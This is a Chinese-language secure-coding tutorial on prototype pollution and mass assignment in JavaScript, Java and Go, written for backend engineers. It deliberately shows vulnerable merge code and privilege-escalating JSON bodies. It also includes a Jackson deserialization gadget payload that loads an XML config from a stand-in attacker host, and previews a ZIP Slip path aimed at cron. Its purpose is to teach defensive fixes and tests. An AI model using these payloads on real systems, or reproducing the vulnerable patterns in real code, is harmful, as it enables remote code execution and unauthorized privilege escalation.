---
title: "Day 43 — Prototype Pollution / Object Injection：當「合併物件」變成漏洞"
date: 2026-06-08
tags: ["Prototype Pollution", "JavaScript", "Injection"]
---

# Day 43 — Prototype Pollution / Object Injection：當「合併物件」變成漏洞

> 適合對象：後端工程師（初學～中階）
> 主題：JSON 反序列化與物件合併時的污染攻擊，以及 Java（Jackson）/ Go（mergo、map merge）的正確寫法
> 預估閱讀時間：18 分鐘

---

## 一、為什麼今天要講這個？

「Prototype Pollution」這個名字最早出現在 Node.js / JavaScript 世界，因為 JS 的物件有一條 `__proto__` 隱藏鏈，攻擊者可以透過合併 JSON 把屬性塞進「全部物件共用的原型」，污染整個程序。

Java 跟 Go 沒有 prototype 這條鏈，是不是就沒事？**並沒有。** 同樣的攻擊面在後端世界叫做 **Object Injection / Unsafe Object Merge / Mass Assignment（Day08）的進階版**。只要你：

- 接收前端送來的 JSON，並用 `ObjectMapper.readerForUpdating(...)`、`BeanUtils.copyProperties`、`mergo.Merge(..., WithOverride)` 之類的 API
- 把它合併（merge）到後端已存在的物件上
- 而沒有白名單欄位

攻擊者就能改掉你**沒打算讓使用者改**的欄位，例如 `isAdmin`、`roleId`、`tenantId`、`passwordHash`。

今天我們從 JS 的原型污染開始，再對應到 Java 和 Go 的真實情境。

---

## 二、原型污染長什麼樣（先看 JS 範例，理解概念）

JS 裡每個 plain object 都有 `__proto__`，指向 `Object.prototype`。如果一段程式碼天真地深度合併：

```javascript
// ❌ 有漏洞的 deep merge
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);  // 遞迴，沒過濾 key
    } else {
      target[key] = source[key];
    }
  }
}

const user = {};
merge(user, JSON.parse('{"__proto__": {"isAdmin": true}}'));

console.log({}.isAdmin);  // → true，所有空物件都被污染了
```

關鍵就在那個 `__proto__` 字串 key，被當成一般屬性處理，順著鏈走進了 `Object.prototype`。

**後端的版本不需要 `__proto__`**，但「沒過濾的 key + 遞迴合併」這個壞模式照樣存在。

---

## 三、Java 場景：Jackson 的 `readerForUpdating`

Jackson 有一個很方便、但很危險的功能：把 JSON 直接合併到既有的 Java 物件上。

```java
// 有漏洞的 PATCH endpoint
public class UserController {
    private final UserRepository repo;
    private final ObjectMapper mapper;

    @PatchMapping("/users/{id}")
    public User patch(@PathVariable Long id, @RequestBody String json) throws Exception {
        User user = repo.findById(id).orElseThrow();
        // ❌ 把整包 JSON 直接合併到 user 上
        mapper.readerForUpdating(user).readValue(json);
        return repo.save(user);
    }
}

public class User {
    private Long id;
    private String email;
    private String passwordHash;
    private boolean admin;     // ← 攻擊目標
    private Long tenantId;     // ← 攻擊目標
    // ...getters / setters
}
```

使用者本來只該改 email，但他送：

```json
{ "email": "a@b.com", "admin": true, "tenantId": 1 }
```

整個 User 物件被覆蓋，他就變管理員了。這就是 **Mass Assignment / Object Injection** 的本體 — Day08 提過，但今天我們聚焦在「合併」這個更隱晦的場景。

### 修法 1：用 DTO 隔離，永遠不要把 entity 直接綁定 JSON

```java
public class UpdateUserRequest {
    @NotBlank @Email
    public String email;
    // 只有這個欄位允許使用者改
}

@PatchMapping("/users/{id}")
public User patch(@PathVariable Long id, @Valid @RequestBody UpdateUserRequest req) {
    User user = repo.findById(id).orElseThrow();
    user.setEmail(req.email);   // 明確指定要更新的欄位
    return repo.save(user);
}
```

### 修法 2：如果一定要用 Jackson 的 readerForUpdating，配 `@JsonView` 或 `@JsonIgnoreProperties`

```java
public class User {
    private String email;

    @JsonIgnore                 // 反序列化時忽略
    private boolean admin;

    @JsonIgnore
    private Long tenantId;

    @JsonIgnore
    private String passwordHash;
}
```

但**這是黑名單**，新增欄位時很容易忘記加 `@JsonIgnore`。**白名單（DTO）一律比較安全。**

### 順帶一提：Jackson polymorphic deserialization（更兇的版本）

如果你有開 `enableDefaultTyping()` 或在欄位上加 `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)`，攻擊者可以塞 `"@class": "..."` 指定要實例化哪個 class — 過去有大量 RCE CVE 都從這條路走（CVE-2017-7525、CVE-2019-12384 等）。

```json
{ "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
  "configLocation": "http://attacker.com/evil.xml" }
```

**規則：**
- 不要開 `enableDefaultTyping()`（Jackson 2.10 後預設關閉，且加了 polymorphic typing safeguards）。
- 如果非用 polymorphic 不可，**用 `@JsonTypeInfo` 搭配 explicit subtypes（白名單）**，不要用 `Id.CLASS`：

```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat"),
})
public abstract class Animal { /* ... */ }
```

---

## 四、Go 場景：`mergo.Merge` 與 `map[string]interface{}` 合併

Go 沒有 prototype 鏈，但開發者常用兩種方式做「合併」，兩種都可能踩雷。

### 場景 A：`mergo.Merge(&dst, src, mergo.WithOverride)`

[mergo](https://dario.cat/mergo)（目前的 import 路徑是 `dario.cat/mergo`，作者 darccio 維護，2025/05 release v1.0.2，目前狀態 stable + frozen）是 Go 圈最常被用的合併套件，container、docker/cli、grafana/loki 都用它做 config merging。

```go
import "dario.cat/mergo"

type User struct {
    Email    string `json:"email"`
    Admin    bool   `json:"admin"`     // ← 攻擊目標
    TenantID int64  `json:"tenant_id"` // ← 攻擊目標
}

// ❌ 有漏洞：把外部 JSON 解析後 merge 到既有使用者上
func patchUser(w http.ResponseWriter, r *http.Request) {
    id := chi.URLParam(r, "id")
    user, _ := db.FindUser(id)

    var patch User
    json.NewDecoder(r.Body).Decode(&patch)

    // WithOverride：source 的非零值會覆蓋 dst
    mergo.Merge(&user, patch, mergo.WithOverride)

    db.Save(user)
}
```

`patch` 只是普通的 `User` struct，攻擊者送 `{"admin": true}` 就會把使用者升級成管理員。

> ⚠️ 順帶一提 mergo 過去也有過 CVE（如 CVE-2023-29401 雖然不是 mergo 本身，但合併型套件的歷史告訴我們：**任何吃「不可信輸入」的合併 API 都要謹慎**）。請定期 `go list -m -u all` 並對照 https://pkg.go.dev/vuln/list。

### 修法：DTO + 白名單欄位

```go
type UpdateUserRequest struct {
    Email string `json:"email"`
}

func patchUser(w http.ResponseWriter, r *http.Request) {
    var req UpdateUserRequest
    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        http.Error(w, "bad json", http.StatusBadRequest)
        return
    }

    id := chi.URLParam(r, "id")
    user, err := db.FindUser(id)
    if err != nil { /* ... */ }

    user.Email = req.Email   // 只改允許的欄位
    db.Save(user)
}
```

DTO 是最簡單也最有效的隔離 — 直接讓編譯器幫你擋下「攻擊者多塞欄位」這件事。

### 嚴格 JSON 解析：`DisallowUnknownFields`

如果你還是想直接 bind 到 entity（例如內部 API），最少把 decoder 設成嚴格模式：

```go
dec := json.NewDecoder(r.Body)
dec.DisallowUnknownFields()
if err := dec.Decode(&req); err != nil {
    http.Error(w, "unknown field: "+err.Error(), http.StatusBadRequest)
    return
}
```

但這只擋掉「明顯不該出現的 key」，**它擋不住「在你 struct 裡有定義、但攻擊者不該改」的欄位**。所以 DTO 還是優先。

### 場景 B：`map[string]interface{}` 的遞迴合併

很多人會手寫類似下面的合併函式，用來做 JSON Patch / config override：

```go
// ❌ 跟 JS 那個遞迴 merge 同樣的壞模式
func deepMerge(dst, src map[string]interface{}) {
    for k, v := range src {
        if vMap, ok := v.(map[string]interface{}); ok {
            if dMap, ok := dst[k].(map[string]interface{}); ok {
                deepMerge(dMap, vMap)
                continue
            }
        }
        dst[k] = v
    }
}
```

在 Go 裡這不會污染「prototype」，但只要這個 map 後面被當成「使用者 profile」、「config」、或被 `json.Marshal` 寫進 DB，攻擊者就能塞任意 key。

**修法：**

1. 用結構化的 struct，而不是 `map[string]interface{}`。
2. 如果非用 map 不可，merge 之前先白名單過濾：

```go
allowedKeys := map[string]bool{"email": true, "nickname": true}
filtered := make(map[string]interface{})
for k, v := range src {
    if allowedKeys[k] {
        filtered[k] = v
    }
}
deepMerge(dst, filtered)
```

---

## 五、共通的防禦原則

無論語言，這類攻擊的本質都是「**不可信來源** + **盲目合併** = 任意欄位覆蓋」。三條規則：

1. **DTO 隔離** — API request 永遠用 DTO 接，不要直接用 entity / domain model。
2. **白名單，不要黑名單** — 列出「允許修改的欄位」，比列出「禁止的欄位」可靠太多。新欄位加進來時，預設應該是不可被使用者修改。
3. **不可信輸入不直接合併** — 任何合併 API（Jackson `readerForUpdating`、`BeanUtils.copyProperties`、`mergo.Merge`、自己寫的 deep merge）一旦吃 request body，就是 attack surface。

額外的：

- **不要打開 `enableDefaultTyping()`** / 不要用 `Id.CLASS`（Jackson polymorphic typing）。
- **`json.Decoder.DisallowUnknownFields()`** 是 Go 端便宜的保險。
- **定期掃描依賴**（Day18），Jackson 跟 mergo 都有 CVE 歷史。

---

## 六、實戰練習：寫一個對應的測試

防禦 mass assignment / object injection 最可靠的方式是寫測試把它釘住。對著任何 PATCH/PUT endpoint，加一個「攻擊測試」：

### Java（Spring Boot + MockMvc）

```java
@Test
void patchUser_shouldIgnoreAdminField() throws Exception {
    User u = createTestUser(/* admin = */ false);

    mockMvc.perform(patch("/users/" + u.getId())
            .contentType(MediaType.APPLICATION_JSON)
            .content("""
                {
                    "email": "new@example.com",
                    "admin": true,
                    "tenantId": 999
                }
                """))
        .andExpect(status().isOk());

    User after = userRepo.findById(u.getId()).orElseThrow();
    assertThat(after.getEmail()).isEqualTo("new@example.com");
    assertThat(after.isAdmin()).isFalse();           // ← 關鍵斷言
    assertThat(after.getTenantId()).isEqualTo(u.getTenantId());
}
```

### Go（net/http/httptest）

```go
func TestPatchUser_IgnoresAdminField(t *testing.T) {
    user := mustCreateUser(t, /* admin = */ false)

    body := `{"email":"new@example.com","admin":true,"tenant_id":999}`
    req := httptest.NewRequest(http.MethodPatch,
        "/users/"+user.ID, strings.NewReader(body))
    rec := httptest.NewRecorder()

    handler.ServeHTTP(rec, req)

    if rec.Code != http.StatusOK {
        t.Fatalf("status = %d", rec.Code)
    }
    after := mustFindUser(t, user.ID)
    if after.Admin {
        t.Error("admin flag was modified by client input")  // ← 關鍵
    }
    if after.TenantID != user.TenantID {
        t.Error("tenant_id was modified by client input")
    }
    if after.Email != "new@example.com" {
        t.Error("email should have been updated")
    }
}
```

只要有這顆測試在 CI 跑，未來不管誰換了 ORM、誰換了序列化套件、誰換了 merge 邏輯，這個漏洞就回不來。

---

## 七、常見迷思

**迷思 1：「我用 ORM 的部分更新就沒事了。」**

JPA 的 `merge()`、GORM 的 `Updates(struct)` 都會因為「零值」議題踩雷：把 `User` struct 整個丟進去更新，會把所有非零欄位寫進 DB。寫成 `Updates(map[string]interface{}{"email": req.Email})` 才安全。

**迷思 2：「用 JSON Patch（RFC 6902）就沒事吧？」**

JSON Patch 本身只是格式，**沒過濾 path 一樣會中**。如果你支援 `{ "op": "replace", "path": "/admin", "value": true }`，那「白名單 path」這件事還是要做。

**迷思 3：「我把 admin 欄位放在另一張表，所以沒事。」**

很好，但只要 foreign key / tenant_id / owner_id 等任何「決定權限歸屬」的欄位在同一張表，就還是要白名單。

---

## 八、今天的功課

1. 找出你專案裡所有 `PATCH`、`PUT`、`POST` 接受 JSON 的 endpoint。
2. 確認每一個都用了 DTO（而不是 entity）做反序列化。
3. 對著最高權限的 endpoint（修改使用者、修改帳號狀態）寫一顆「攻擊測試」，斷言敏感欄位**不會**被 request body 改掉。
4. 如果你用 Jackson：grep `enableDefaultTyping`，有的話想辦法移掉或改成 explicit subtypes。
5. 如果你用 mergo：grep `mergo.Merge`，盤點哪些 source 是「使用者送進來的」，把那些都改成 DTO + 明確賦值。

---

## 九、明日預告

Day 44 我們會講 **ZIP Slip — 壓縮檔解壓縮的路徑穿越攻擊**。當你解壓使用者上傳的 zip / tar 時，如果直接信任壓縮檔裡每個 entry 的檔名，一個 `../../../etc/cron.d/backdoor` 的 entry 就能讓解壓動作把檔案寫到任意路徑。明天會講為什麼每個 entry 都要做 prefix 驗證，以及 Java 與 Go 的正確解壓姿勢。

---

> 📌 **核心一句話**：DTO 永遠是第一道防線。任何「把外部 JSON 合併到後端物件」的 API，預設就是 mass assignment 漏洞，除非你能證明每個欄位都在白名單裡。
